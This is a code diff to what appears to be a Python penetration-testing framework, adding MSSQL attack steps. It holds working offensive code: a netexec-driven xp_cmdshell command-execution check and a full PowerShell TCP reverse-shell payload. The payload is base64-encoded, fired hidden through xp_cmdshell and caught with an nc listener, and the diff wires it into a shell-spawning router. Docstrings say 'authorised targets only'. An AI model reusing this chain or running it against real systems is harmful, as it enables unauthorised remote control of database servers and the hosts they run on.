@@ -2290,6 +2290,22 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bp) mssql-shell: a PowerShell reverse shell was fired through xp_cmdshell
+    if sid == "mssql-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"MSSQL foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bo) mssql-exec: xp_cmdshell command execution confirmed
+    if sid == "mssql-exec":
+        mo = re.search(r"^✗ EXEC .*running as (.+)$", output, re.M)
+        if mo:
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"MSSQL xp_cmdshell RCE as {mo.group(1).strip()}"[:140]}
+        return None
+
     # 2bn) mssql-creds: sa/default/reused login → DB access (sysadmin = command exec)
     if sid == "mssql-creds":
         hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
@@ -3409,7 +3425,7 @@ _EXPLOIT_STEPS = {
     "mssql": [
         ("Banner: SQL Browser (1434) / TDS pre-login → version + instance", "mssql-banner"),
         ("sa blank/default + reused creds (netexec mssql); flags sysadmin", "mssql-creds"),
-        "Enable & use xp_cmdshell for OS command execution → reverse shell",
+        ("xp_cmdshell command execution (sysadmin) → foothold", "mssql-exec"),
         "Enumerate linked servers; EXECUTE AS / trustworthy DB for privilege abuse",
         "Coerce the service account's NetNTLM hash (xp_dirtree / xp_fileexist) → crack / relay",
         "Read/write files (OPENROWSET / bulk); loot connection strings",
@@ -13394,6 +13410,117 @@ def _tool_mssql_creds(ip: str, port: int, proto: str) -> str:
     return f"MSSQL credentials — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MSSQL step 3: xp_cmdshell OS command execution (sysadmin) → foothold ────────
+def _mssql_run_cmd(ip: str, port: int, user: str, pw: str, cmd: str, timeout: int = 60) -> tuple:
+    """Run an OS command via netexec mssql -x (xp_cmdshell, auto-enabled if sysadmin).
+    Returns (rc, ansi-stripped output) or (None, '') if netexec is absent."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return (None, "")
+    try:
+        p = subprocess.run([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
+                            "--local-auth", "-x", cmd], capture_output=True, text=True, timeout=timeout)
+        return (p.returncode, re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or "")))
+    except (OSError, subprocess.SubprocessError):
+        return (None, "")
+
+
+def _tool_mssql_exec(ip: str, port: int, proto: str) -> str:
+    """MSSQL step 3 tool: confirm OS command execution via xp_cmdshell over a sysadmin cred
+    (netexec auto-enables it), running whoami to prove the channel and its context (often
+    nt service\\MSSQLSERVER or SYSTEM). Non-interactive — spawning a reverse shell is spawn-shell
+    (r1). No sysadmin cred / no netexec → raises. Authorised targets only."""
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("netexec (nxc) required for MSSQL command execution")
+    admins = _gather_mssql_admin(ip)
+    if not admins:
+        raise RuntimeError("no sysadmin MSSQL cred — run mssql-creds (r2) first (need Pwn3d!)")
+    user, pw = admins[0]
+    rc, out = _mssql_run_cmd(ip, port, user, pw, "whoami", 60)
+    if rc is None:
+        raise RuntimeError(f"{ip}:{port} — netexec mssql did not run (down / wrong port?)")
+    body = _nxc_body(out)
+    ctx = ""
+    for ln in reversed([l.strip() for l in body.splitlines() if l.strip()]):
+        if "\\" in ln or ln.lower() == "system":
+            ctx = ln
+            break
+
+    lines = [f"[*] xp_cmdshell over {user}"]
+    if ctx:
+        lines.append(f"✗ EXEC command execution confirmed — running as {ctx}")
+        lines.append("· spawn a reverse shell: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        lines.append("· xp_cmdshell returned no context — enable it manually "
+                     "(EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE) or check the cred is sysadmin")
+    return f"MSSQL exec — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+# PowerShell TCP reverse shell (base64 for `powershell -e`), fired through xp_cmdshell.
+_MSSQL_PS_REVSHELL = (
+    "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
+    "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
+    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+    "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")
+
+
+def _tool_mssql_shell(ip: str, port: int, proto: str) -> str:
+    """MSSQL foothold (INTERACTIVE): spawn a listener and fire a PowerShell reverse shell through
+    xp_cmdshell over a sysadmin cred (netexec -x). Headless prints the listener + trigger.
+    Authorised targets only."""
+    import base64
+    import time
+    if not (shutil.which("netexec") or shutil.which("nxc")):
+        print(f"\n{RED}✗ netexec not installed{RESET} — needed to fire the shell via xp_cmdshell.")
+        return "mssql-shell: netexec not installed"
+    admins = _gather_mssql_admin(ip)
+    if not admins:
+        print(f"\n{YELLOW}no sysadmin MSSQL cred{RESET} — run {BOLD}mssql-creds (r2){RESET} first.")
+        return "mssql-shell: no sysadmin cred (run mssql-creds r2)"
+    if len(admins) == 1:
+        user, pw = admins[0]
+    else:
+        print(f"\n{BOLD}sysadmin creds{RESET}")
+        for i, (u, _p) in enumerate(admins, 1):
+            print(f"  {BOLD}{i}{RESET}  {u}")
+        v = _ask("pick cred [1-N, blank = 1]:")
+        user, pw = admins[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(admins)) else admins[0]
+
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        print(f"{RED}✗ could not determine our IP toward {ip}{RESET}")
+        return "mssql-shell: no LHOST"
+    lport = _free_local_port(4444)
+    if lport != 4444:
+        print(f"{YELLOW}port 4444 in use{RESET}{DIM} — using {BOLD}{lport}{RESET}{DIM} for the listener{RESET}")
+    ps = _MSSQL_PS_REVSHELL.format(ip=lhost, port=lport)
+    b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
+    pscmd = f"powershell -nop -w hidden -e {b64}"
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+
+    term = _open_shell_terminal(f"nc -lvnp {lport}")
+    if not term:
+        print(f"{YELLOW}headless{RESET} — start {BOLD}nc -lvnp {lport}{RESET}, then fire:\n  "
+              f"{BOLD}{nxc} mssql {ip} --port {port} -u {user} -p '{pw}' --local-auth -x '{pscmd}'{RESET}")
+        return f"mssql-shell: headless — trigger shown ({user}@{ip})"
+    print(f"{GREEN}▶ listener nc -lvnp {lport} in a new {term} window{RESET} {DIM}(LHOST {lhost}){RESET}")
+
+    def _fire():
+        try:
+            subprocess.Popen([nxc, "mssql", ip, "--port", str(port), "-u", user, "-p", pw,
+                              "--local-auth", "-x", pscmd], stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
+        except OSError:
+            pass
+    time.sleep(1.5)
+    for _ in range(2):
+        _fire()
+        time.sleep(2.0)
+    print(f"  {DIM}→ check the new terminal for your {GREEN}shell{RESET}{DIM} (xp_cmdshell → PowerShell){RESET}")
+    return f"mssql-shell: shell → {user}@{ip}:{lport}"
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13433,6 +13560,9 @@ def _spawn_shell_paths(ip: str) -> list:
         rce = next((o for s, o in fetch_scripts(ip, p, pr) if s == "mysql-rce"), "")
         if "✗ RCE " in rce:
             paths.append(("MySQL", "reverse shell via the INTO OUTFILE webshell", "mysql-shell", p, pr))
+    for p, pr in by_key.get("mssql", []):
+        if _gather_mssql_admin(ip):
+            paths.append(("MSSQL", "xp_cmdshell → PowerShell reverse shell (sysadmin)", "mssql-shell", p, pr))
     return paths
 
 
@@ -13544,6 +13674,8 @@ _STEP_TOOLS = {
     "mysql-next": ("manual MySQL steps (context-aware, reference only)", _tool_mysql_next),
     "mssql-banner": ("MSSQL fingerprint — SQL Browser 1434 / TDS pre-login → version (stdlib)", _tool_mssql_banner),
     "mssql-creds": ("sa blank/default + reused creds (netexec mssql, flags sysadmin)", _tool_mssql_creds),
+    "mssql-exec": ("xp_cmdshell command exec confirm (netexec -x, sysadmin)", _tool_mssql_exec),
+    "mssql-shell": ("MSSQL foothold → xp_cmdshell PowerShell reverse shell (spawned)", _tool_mssql_shell),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -13634,6 +13766,8 @@ _STEP_TOOL_RUNS = {
     "mysql-next":       ("reference · no scan", None),
     "mssql-banner":     ("Python (stdlib) + searchsploit", None),
     "mssql-creds":      ("netexec mssql", f"{_mins(_MSSQLCREDS_DEADLINE)} min"),
+    "mssql-exec":       ("netexec mssql -x", None),
+    "mssql-shell":      ("netexec + nc listener", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -13817,6 +13951,10 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
               f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
               f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
               f"{DIM} · authorised targets only{RESET}")
+    if tool_key == "mssql-exec":                  # active command exec via xp_cmdshell
+        print(f"{YELLOW}   ⚠ command execution{RESET}{DIM} — runs whoami via xp_cmdshell over a sysadmin "
+              f"cred (netexec auto-enables xp_cmdshell). "
+              f"{RESET}{YELLOW}authorised targets only{RESET}")
     if tool_key == "mysql-rce":                   # WRITES a webshell — SQL can't delete it
         print(f"{YELLOW}   ⚠ WRITES a webshell{RESET}{DIM} — SELECT … INTO DUMPFILE a PHP shell into "
               f"common web roots, exec-verifies over HTTP. "
